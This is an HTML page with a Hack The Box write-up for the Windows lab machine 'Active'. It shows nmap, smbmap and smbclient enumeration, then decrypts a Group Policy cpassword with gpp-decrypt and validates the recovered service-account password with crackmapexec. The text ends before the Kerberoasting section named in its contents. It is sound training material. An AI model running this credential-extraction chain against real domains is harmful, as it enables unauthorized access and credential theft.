<!doctype html><html lang=es>
<head>
<title>Active | 7Rocky</title><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=description content="Hack The Box. Windows. Easy machine. This machine presents an Active Directory (AD) environment to perform SMB enumeration, password decrypting and Kerberoasting. Basic AD enumeration and exploitation skills are needed to compromise this machine">
<meta name=robots content="index, follow">
<meta name=image content="https://7rocky.github.io/images/HTB/Active/Active.png">
<meta name=author content="7Rocky">
<meta property="og:title" content="Active">
<meta property="og:description" content="Hack The Box. Windows. Easy machine. This machine presents an Active Directory (AD) environment to perform SMB enumeration, password decrypting and Kerberoasting. Basic AD enumeration and exploitation skills are needed to compromise this machine">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7rocky.github.io/en/htb/active/"><meta property="article:section" content="htb">
<meta property="article:published_time" content="2018-12-08T00:00:00+01:00">
<meta property="article:modified_time" content="2022-03-03T11:41:37+01:00"><meta property="og:site_name" content="7Rocky">
<meta property="og:image" content="https://7rocky.github.io/images/HTB/Active/Active.png">
<meta property="og:author" content="7Rocky">
<meta itemprop=name content="Active">
<meta itemprop=description content="Hack The Box. Windows. Easy machine. This machine presents an Active Directory (AD) environment to perform SMB enumeration, password decrypting and Kerberoasting. Basic AD enumeration and exploitation skills are needed to compromise this machine"><meta itemprop=datePublished content="2018-12-08T00:00:00+01:00">
<meta itemprop=dateModified content="2022-03-03T11:41:37+01:00">
<meta itemprop=wordCount content="1550">
<meta itemprop=keywords content="smb,kerberoasting,active-directory,hash-cracking,">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Active">
<meta name=twitter:description content="Hack The Box. Windows. Easy machine. This machine presents an Active Directory (AD) environment to perform SMB enumeration, password decrypting and Kerberoasting. Basic AD enumeration and exploitation skills are needed to compromise this machine">
<meta name=twitter:image content="https://7rocky.github.io/images/HTB/Active/Active.png">
<meta name=twitter:author content="7Rocky">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script>
<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
<link href=/css/style.css rel=stylesheet>
<link href=/css/monokai-sublime.min.css rel=stylesheet>
<link href=/css/code.css rel=stylesheet>
<link href=/css/main.css rel=stylesheet>
<script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
<script src=/js/main.js></script>
<div style=display:none>
$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$
</div></head><body class="ma0 production">
<header>
<div class=bg-black>
<nav class="pv3 ph3 ph4-ns" role=navigation>
<div class="flex-l justify-between items-center center">
<a class="f3 fw2 hover-white no-underline white-90 dib" href=/en/ title=7Rocky>7Rocky</a>
<div class="flex-l items-center">
<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/htb/active/ title=es>
<img alt=es height=32px src=/images/es.png width=32px>
</a>
<ul class="pl0 ml3 mr3">
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/ctf/ title=CTF>CTF</a>
</li><li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/htb/ title=HTB>HTB</a>
</li><li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/imc/ title=IMC>IMC</a>
</li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div></div></nav></div></header><main class=pb7 role=main>
<article class="flex-l flex-wrap justify-between mw8 center ph3">
<header class="mt4 w-100">
<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside><div id=sharing class=mt3>
<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/active/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a>
<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/active/&text=Active" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/htb/active/&title=Active" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
</div><h1 class="f1 mt3 mb1">Active</h1><time class="f6 mv4 dib tracked" datetime=2018-12-08T00:00:00+01:00>08 / 12 / 2018</time>
</header><div class=htb-image>
<img alt=Active src=/images/HTB/Active/Active.png>
</div><ul class="nested-links tags">
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/smb title=SMB>SMB</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/kerberoasting title=Kerberoasting>Kerberoasting</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/active-directory title="Active Directory">Active Directory</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/hash-cracking title="Password hash cracking">Password hash cracking</a>
</li></ul><aside aria-label=aside class="w-20-l mt6-l aside-mobile">
<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
<p class="f5 b mb3">Contents of this write-up</p><nav id=TableOfContents>
<ul>
<li><a href=#port-scanning>Port scanning</a></li><li><a href=#smb-enumeration>SMB enumeration</a></li><li><a href=#decrypting-password-from-groupsxml>Decrypting password from <code>Groups.xml</code></a></li><li><a href=#more-smb-enumeration>More SMB enumeration</a></li><li><a href=#kerberoasting-attack>Kerberoasting attack</a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul>
<li>
<strong>OS</strong>: Windows
</li><li>
<strong>Difficulty</strong>: Easy
</li><li>
<strong>IP Address</strong>: 10.10.10.100
</li><li>
<strong>Release</strong>: 28 / 07 / 2018
</li></ul><h2 id=port-scanning>Port scanning</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.100 -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49171,49182 
</span></span><span style=display:flex><span>Nmap scan report for 10.10.10.100
</span></span><span style=display:flex><span>Host is up (0.10s latency).
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE       VERSION
</span></span><span style=display:flex><span>53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
</span></span><span style=display:flex><span>| dns-nsid:
</span></span><span style=display:flex><span>|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
</span></span><span style=display:flex><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: )
</span></span><span style=display:flex><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds?
</span></span><span style=display:flex><span>464/tcp   open  kpasswd5?
</span></span><span style=display:flex><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>636/tcp   open  tcpwrapped
</span></span><span style=display:flex><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
</span></span><span style=display:flex><span>3269/tcp  open  tcpwrapped
</span></span><span style=display:flex><span>5722/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style=display:flex><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style=display:flex><span>|_http-title: Not Found
</span></span><span style=display:flex><span>49152/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49153/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49154/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49155/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>49158/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49169/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49171/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49182/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>|_clock-skew: 12m57s
</span></span><span style=display:flex><span>| smb2-security-mode:
</span></span><span style=display:flex><span>|   2.02:
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>| smb2-time:
</span></span><span style=display:flex><span>|   date:
</span></span><span style=display:flex><span>|_  start_date:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span># Nmap done -- 1 IP address (1 host up) scanned in 71.22 seconds
</span></span></code></pre></div><p>This machine has ports 53 (DNS), 88 (Kerberos), 135 (MS-RPC), 389 (LDAP) and 445 (SMB) open, within others.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ crackmapexec smb 10.10.10.100
</span></span><span style=display:flex><span>SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) 
</span></span></code></pre></div><p>Moreover, we see that the machine is a domain controler (DC) from an Active Directory (AD) environment. We can start adding <code>active.htb</code> into <code>/etc/hosts</code>.</p><h2 id=smb-enumeration>SMB enumeration</h2><p>Using <code>smbmap</code> and a null session, we can enumerate SMB shares:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ smbmap -u <span style=color:#e6db74>&#39;&#39;</span> -p <span style=color:#e6db74>&#39;&#39;</span> -H 10.10.10.100
</span></span><span style=display:flex><span>[+] IP: 10.10.10.100:445        Name: 10.10.10.100
</span></span><span style=display:flex><span>        Disk                                                    Permissions     Comment
</span></span><span style=display:flex><span>        ----                                                    -----------     -------
</span></span><span style=display:flex><span>        ADMIN$                                                  NO ACCESS       Remote Admin
</span></span><span style=display:flex><span>        C$                                                      NO ACCESS       Default share
</span></span><span style=display:flex><span>        IPC$                                                    NO ACCESS       Remote IPC
</span></span><span style=display:flex><span>        NETLOGON                                                NO ACCESS       Logon server share 
</span></span><span style=display:flex><span>        Replication                                             READ ONLY
</span></span><span style=display:flex><span>        SYSVOL                                                  NO ACCESS       Logon server share
</span></span><span style=display:flex><span>        Users                                                   NO ACCESS
</span></span></code></pre></div><p>As it is shown, we have access to a share called <code>Replication</code>. We can download all the files using <code>smbclient</code> as follows:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ smbclient <span style=color:#ae81ff>\\\\</span>10.10.10.100<span style=color:#ae81ff>\\</span>Replication -N
</span></span><span style=display:flex><span>Anonymous login successful
</span></span><span style=display:flex><span>Try &#34;help&#34; to get a list of possible commands.
</span></span><span style=display:flex><span>smb: \&gt; dir
</span></span><span style=display:flex><span>  .                                   D        0  Sat Jul 21 06:37:44 2018
</span></span><span style=display:flex><span>  ..                                  D        0  Sat Jul 21 06:37:44 2018
</span></span><span style=display:flex><span>  active.htb                          D        0  Sat Jul 21 06:37:44 2018
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>                10459647 blocks of size 4096. 5725771 blocks available
</span></span><span style=display:flex><span>smb: \&gt; cd active.htb
</span></span><span style=display:flex><span>smb: \active.htb\&gt; recurse ON
</span></span><span style=display:flex><span>smb: \active.htb\&gt; prompt OFF
</span></span><span style=display:flex><span>smb: \active.htb\&gt; mget *
</span></span><span style=display:flex><span>getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
</span></span><span style=display:flex><span>getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
</span></span><span style=display:flex><span>getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.3 KiloBytes/sec) (average 0.1 KiloBytes/sec)
</span></span><span style=display:flex><span>getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (7.7 KiloBytes/sec) (average 2.0 KiloBytes/sec)
</span></span><span style=display:flex><span>getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (1.4 KiloBytes/sec) (average 1.9 KiloBytes/sec)
</span></span><span style=display:flex><span>getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (3.0 KiloBytes/sec) (average 2.1 KiloBytes/sec)
</span></span><span style=display:flex><span>getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (10.4 KiloBytes/sec) (average 3.2 KiloBytes/sec) 
</span></span></code></pre></div><p>Now we have got these files from the machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ tree active.htb
</span></span><span style=display:flex><span>active.htb
</span></span><span style=display:flex><span>├── DfsrPrivate
</span></span><span style=display:flex><span>│   ├── ConflictAndDeleted
</span></span><span style=display:flex><span>│   ├── Deleted
</span></span><span style=display:flex><span>│   └── Installing
</span></span><span style=display:flex><span>├── Policies
</span></span><span style=display:flex><span>│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9} 
</span></span><span style=display:flex><span>│   │   ├── GPT.INI
</span></span><span style=display:flex><span>│   │   ├── Group Policy
</span></span><span style=display:flex><span>│   │   │   └── GPE.INI
</span></span><span style=display:flex><span>│   │   ├── MACHINE
</span></span><span style=display:flex><span>│   │   │   ├── Microsoft
</span></span><span style=display:flex><span>│   │   │   │   └── Windows NT
</span></span><span style=display:flex><span>│   │   │   │       └── SecEdit
</span></span><span style=display:flex><span>│   │   │   │           └── GptTmpl.inf
</span></span><span style=display:flex><span>│   │   │   ├── Preferences
</span></span><span style=display:flex><span>│   │   │   │   └── Groups
</span></span><span style=display:flex><span>│   │   │   │       └── Groups.xml
</span></span><span style=display:flex><span>│   │   │   └── Registry.pol
</span></span><span style=display:flex><span>│   │   └── USER
</span></span><span style=display:flex><span>│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
</span></span><span style=display:flex><span>│       ├── GPT.INI
</span></span><span style=display:flex><span>│       ├── MACHINE
</span></span><span style=display:flex><span>│       │   └── Microsoft
</span></span><span style=display:flex><span>│       │       └── Windows NT
</span></span><span style=display:flex><span>│       │           └── SecEdit
</span></span><span style=display:flex><span>│       │               └── GptTmpl.inf
</span></span><span style=display:flex><span>│       └── USER
</span></span><span style=display:flex><span>└── scripts
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>21 directories, 7 files
</span></span></code></pre></div><h2 id=decrypting-password-from-groupsxml>Decrypting password from <code>Groups.xml</code></h2><p>There is a file called <code>Groups.xml</code>. This file is used to set group policies for the domain. The file looks like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;Groups</span> <span style=color:#a6e22e>clsid=</span><span style=color:#e6db74>&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;User</span> <span style=color:#a6e22e>clsid=</span><span style=color:#e6db74>&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34;</span> <span style=color:#a6e22e>name=</span><span style=color:#e6db74>&#34;active.htb\SVC_TGS&#34;</span> <span style=color:#a6e22e>image=</span><span style=color:#e6db74>&#34;2&#34;</span> <span style=color:#a6e22e>changed=</span><span style=color:#e6db74>&#34;2018-07-18 20:46:06&#34;</span> <span style=color:#a6e22e>uid=</span><span style=color:#e6db74>&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;Properties</span> <span style=color:#a6e22e>action=</span><span style=color:#e6db74>&#34;U&#34;</span> <span style=color:#a6e22e>newName=</span><span style=color:#e6db74>&#34;&#34;</span> <span style=color:#a6e22e>fullName=</span><span style=color:#e6db74>&#34;&#34;</span> <span style=color:#a6e22e>description=</span><span style=color:#e6db74>&#34;&#34;</span> <span style=color:#a6e22e>cpassword=</span><span style=color:#e6db74>&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span> <span style=color:#a6e22e>changeLogon=</span><span style=color:#e6db74>&#34;0&#34;</span> <span style=color:#a6e22e>noChange=</span><span style=color:#e6db74>&#34;1&#34;</span> <span style=color:#a6e22e>neverExpires=</span><span style=color:#e6db74>&#34;1&#34;</span> <span style=color:#a6e22e>acctDisabled=</span><span style=color:#e6db74>&#34;0&#34;</span> <span style=color:#a6e22e>userName=</span><span style=color:#e6db74>&#34;active.htb\SVC_TGS&#34;</span> <span style=color:#f92672>/&gt;</span> 
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;/User&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/Groups&gt;</span>
</span></span></code></pre></div><p>There is a user called <code>SVC_TGS</code>. The user&rsquo;s password is encrypted in a property called <code>cpassword</code>. However, we are able to decrypt it because Microsoft published the cipher key for the algorithm (more information <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be>here</a>). The decryption can be done using <code>gpp-decrypt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ gpp-decrypt <span style=color:#e6db74>&#39;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#39;</span> 
</span></span><span style=display:flex><span>GPPstillStandingStrong2k18
</span></span></code></pre></div><p>Now let&rsquo;s check with <a href=https://github.com/byt3bl33d3r/CrackMapExec><code>crackmapexec</code></a> that the credentials are valid:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ crackmapexec smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18
</span></span><span style=display:flex><span>SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
</span></span><span style=display:flex><span>SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
</span></span></code></pre></div><h2 id=more-smb-enumeration>More SMB enumeration</h2><p>Now that we have valid credentials, we can check if we have more permissions in SMB:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18
